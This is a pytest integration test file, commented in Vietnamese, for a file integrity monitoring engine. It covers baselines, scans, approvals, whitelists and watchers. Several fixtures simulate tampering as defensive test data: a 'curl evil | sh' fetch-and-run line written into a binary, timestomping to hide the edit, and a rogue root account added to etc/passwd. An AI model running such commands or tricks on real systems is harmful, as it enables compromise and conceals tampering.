"""Test tích hợp: ba module ghép lại có chạy đúng với nhau không.

Đây là bộ test bắt được lỗi mà test từng module bỏ qua — ví dụ sự kiện được lưu
nhưng verdict không gắn đúng ``event_id``.
"""

from __future__ import annotations

import os
import time
from pathlib import Path

import pytest

from fim.config import Config
from fim.engine import Engine
from fim.models import ChangeType, Classification, Severity


@pytest.fixture
def engine(config: Config) -> Engine:
    e = Engine(config)
    yield e
    e.close()


class TestBaselineThenScan:
    def test_baseline_roi_quet_khong_ra_thay_doi(self, engine: Engine):
        engine.build_baseline("b1")
        assert engine.scan_once().events_processed == 0

    def test_quet_khi_chua_co_baseline_bao_loi_ro(self, engine: Engine):
        with pytest.raises(ValueError, match="Chưa có baseline"):
            engine.scan_once()

    def test_su_kien_va_verdict_lien_ket_dung(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "etc/app.conf").write_text("da doi\n", encoding="utf-8")
        engine.scan_once()

        events = engine.store.query_events()
        assert len(events) == 1
        assert events[0]["verdict"] is not None          # verdict gắn đúng event

        verdict = engine.store.get_verdict(events[0]["id"])
        assert verdict is not None and verdict.event_id == events[0]["id"]

    def test_thay_doi_trong_yeu_bi_cham_diem_cao(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "etc/passwd").write_text(
            "root:x:0:0::/root:/bin/sh\nevil:x:0:0::/root:/bin/sh\n", encoding="utf-8"
        )
        engine.scan_once()

        verdict = engine.store.get_verdict(engine.store.query_events()[0]["id"])
        assert "H001" in {h.rule_id for h in verdict.hits}
        assert verdict.severity.rank >= Severity.MEDIUM.rank

    def test_thay_doi_thuong_khong_bi_bao_dong(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        with open(tmp_tree / "var/log/app.log", "a", encoding="utf-8") as fh:
            fh.write("dong moi\n")
        engine.scan_once()

        verdict = engine.store.get_verdict(engine.store.query_events()[0]["id"])
        assert verdict.classification == Classification.BENIGN
        assert engine.stats.alerts_raised == 0

    def test_timestomp_bi_bat_qua_toan_bo_duong_ong(self, engine: Engine, tmp_tree: Path):
        """Kịch bản thật: sửa nhị phân rồi khôi phục mtime để che dấu vết."""
        engine.build_baseline("b1")
        target = tmp_tree / "bin/tool"
        original = target.stat()
        target.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
        os.utime(target, (original.st_atime, original.st_mtime))

        engine.scan_once()
        verdict = engine.store.get_verdict(engine.store.query_events()[0]["id"])
        assert "H020" in {h.rule_id for h in verdict.hits}
        assert verdict.severity == Severity.CRITICAL

    def test_phat_hien_xoa_file(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "etc/passwd").unlink()
        engine.scan_once()

        event = engine.store.query_events()[0]
        assert event["change"] == ChangeType.DELETED.value
        verdict = engine.store.get_verdict(event["id"])
        assert "H022" in {h.rule_id for h in verdict.hits}

    def test_phat_hien_file_moi(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "etc/backdoor.conf").write_text("x\n", encoding="utf-8")
        engine.scan_once()
        assert engine.store.query_events()[0]["change"] == ChangeType.CREATED.value


class TestApprove:
    def test_approve_lam_lan_quet_sau_im_lang(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "etc/app.conf").write_text("da duyet\n", encoding="utf-8")
        engine.scan_once()

        event_id = engine.store.query_events()[0]["id"]
        assert engine.approve([event_id]) == 1

        before = engine.stats.events_processed
        engine.scan_once()
        assert engine.stats.events_processed == before      # không có sự kiện mới

    def test_approve_file_da_xoa(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "var/log/app.log").unlink()
        engine.scan_once()

        engine.approve([engine.store.query_events()[0]["id"]])
        before = engine.stats.events_processed
        engine.scan_once()
        assert engine.stats.events_processed == before

    def test_approve_id_khong_ton_tai(self, engine: Engine):
        engine.build_baseline("b1")
        assert engine.approve([999]) == 0


class TestWhitelistIntegration:
    def test_whitelist_chan_canh_bao(self, config: Config, tmp_tree: Path):
        posix = str(tmp_tree).replace("\\", "/")
        with Engine(config) as engine:
            engine.build_baseline("b1")
            from fim.models import WhitelistEntry

            engine.whitelist.add(WhitelistEntry(
                id="w-passwd", path_glob=f"{posix}/etc/passwd",
                reason="thay đổi có kế hoạch",
            ))
            (tmp_tree / "etc/passwd").write_text("root:x:0:0::/root:/bin/sh\nnew\n",
                                                encoding="utf-8")
            engine.scan_once()

            verdict = engine.store.get_verdict(engine.store.query_events()[0]["id"])
            assert verdict.whitelisted
            assert engine.stats.alerts_raised == 0

    def test_whitelist_theo_luat_van_bat_luat_khac(self, config: Config, tmp_tree: Path):
        posix = str(tmp_tree).replace("\\", "/")
        with Engine(config) as engine:
            engine.build_baseline("b1")
            from fim.models import WhitelistEntry

            engine.whitelist.add(WhitelistEntry(
                id="w-h001", path_glob=f"{posix}/bin/**", rule_id="H001",
                reason="chỉ tắt luật file trọng yếu",
            ))
            target = tmp_tree / "bin/tool"
            original = target.stat()
            target.write_text("#!/bin/sh\nevil\n", encoding="utf-8")
            os.utime(target, (original.st_atime, original.st_mtime))
            engine.scan_once()

            verdict = engine.store.get_verdict(engine.store.query_events()[0]["id"])
            ids = {h.rule_id for h in verdict.hits}
            assert "H001" not in ids           # đã bị whitelist tắt
            assert "H020" in ids               # timestomp vẫn bị bắt
            assert not verdict.whitelisted


class TestHooks:
    def test_hook_duoc_goi_moi_su_kien(self, engine: Engine, tmp_tree: Path):
        seen = []
        engine.on_hook(lambda e, v, a: seen.append((e.path, v.severity)))

        engine.build_baseline("b1")
        (tmp_tree / "etc/app.conf").write_text("x\n", encoding="utf-8")
        (tmp_tree / "etc/moi.conf").write_text("y\n", encoding="utf-8")
        engine.scan_once()

        assert len(seen) == 2


class TestStats:
    def test_thong_ke_engine_khop_csdl(self, engine: Engine, tmp_tree: Path):
        engine.build_baseline("b1")
        (tmp_tree / "etc/app.conf").write_text("x\n", encoding="utf-8")
        (tmp_tree / "etc/passwd").write_text("root:x:0:0::/r:/bin/sh\nevil\n",
                                             encoding="utf-8")
        engine.scan_once()

        assert engine.stats.events_processed == 2
        assert engine.store.count_events() == 2
        assert sum(engine.stats.by_severity.values()) == 2

    def test_lan_quet_duoc_ghi_lai(self, engine: Engine):
        engine.build_baseline("b1")
        engine.scan_once()
        scans = engine.store.recent_scans(5)
        assert any(s["mode"] == "scan" and s["status"] == "ok" for s in scans)


class TestPollingWatcher:
    def test_run_once_phat_hien_thay_doi(self, config: Config, tmp_tree: Path):
        from fim.collector.watcher import PollingWatcher
        from fim.config import WatchConfig

        with Engine(config) as engine:
            engine.build_baseline("b1")
            collected = []
            watcher = PollingWatcher(
                engine.store, engine.scope, collected.append,
                WatchConfig(mode="polling", poll_interval="1s"), config.baseline,
            )
            (tmp_tree / "etc/app.conf").write_text("doi roi\n", encoding="utf-8")
            assert watcher.run_once() == 1
            assert collected[0].change == ChangeType.MODIFIED


class TestWatcherFactory:
    def test_mode_polling_tra_ve_polling(self, config: Config):
        from fim.collector.watcher import PollingWatcher, create_watcher
        from fim.config import WatchConfig

        with Engine(config) as engine:
            engine.build_baseline("b1")
            watcher = create_watcher(
                engine.store, engine.scope, lambda e: None,
                WatchConfig(mode="polling"), config.baseline,
            )
            assert isinstance(watcher, PollingWatcher)

    def test_mode_la_bao_loi(self, config: Config):
        from fim.collector.watcher import create_watcher
        from fim.config import WatchConfig

        with Engine(config) as engine:
            engine.build_baseline("b1")
            with pytest.raises(ValueError, match="watch.mode"):
                create_watcher(engine.store, engine.scope, lambda e: None,
                               WatchConfig(mode="turbo"), config.baseline)
